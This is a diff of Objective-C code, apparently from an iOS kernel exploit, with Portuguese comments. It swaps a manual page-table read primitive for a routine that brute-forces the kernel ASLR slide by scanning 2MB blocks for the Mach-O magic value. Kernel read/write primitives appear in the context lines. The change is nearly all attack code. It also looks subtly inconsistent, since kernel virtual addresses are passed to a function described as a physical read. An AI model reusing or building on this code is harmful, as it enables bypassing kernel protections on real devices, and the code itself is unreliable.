@@ -36,16 +36,28 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, uint64_t, uint64_t);
     return val;
 }
 
-- (uint64_t)kread64:(uint64_t)va {
-    if (va < 0xFFFFFFF000000000ULL) return 0;
+- (uint64_t)leakKernelSlide {
+    // No iOS 26.4, o slide é um múltiplo de 0x200000 (2MB)
+    // Se o seu trigger nativo não passou o slide, vamos tentar ler a base padrão
+    // e subir em blocos de 2MB até encontrar o Magic 0xfeedfacf.
     
-    // Page Table Walk manual para iOS 26 (A13/arm64e)
-    uint64_t ttbr1 = _kBase + 0x8E10000ULL; // TTB1 Base Offset
-    uint64_t l1 = [self physRead64:(ttbr1 + ((va>>30)&0x1FF)*8)] & 0xFFFFFFFFF000ULL;
-    uint64_t l2 = [self physRead64:(l1 + ((va>>21)&0x1FF)*8)] & 0xFFFFFFFFF000ULL;
-    uint64_t l3 = [self physRead64:(l2 + ((va>>12)&0x1FF)*8)] & 0xFFFFFFFFF000ULL;
-    return [self physRead64:(l3 | (va & 0xFFF))];
+    uint64_t search_base = 0xFFFFFFF007004000ULL;
+    for (uint64_t i = 0; i < 0x200; i++) { // Busca em um range de 1GB
+        uint64_t trial_addr = search_base + (i * 0x200000ULL) + 0x4000;
+        uint32_t magic = [self physRead32:trial_addr]; // Usando leitura física direta
+        if (magic == 0xfeedfacf) {
+            return (i * 0x200000ULL);
+        }
+    }
+    return 0;
 }
+
+// Helper para leitura de 32 bits física para a busca
+- (uint32_t)physRead32:(uint64_t)pa {
+    uint64_t val = [self physRead64:pa];
+    return (uint32_t)(val & 0xFFFFFFFF);
+}
+
 
 - (void)kwrite64:(uint64_t)va value:(uint64_t)v {
     uint64_t tg = 0;
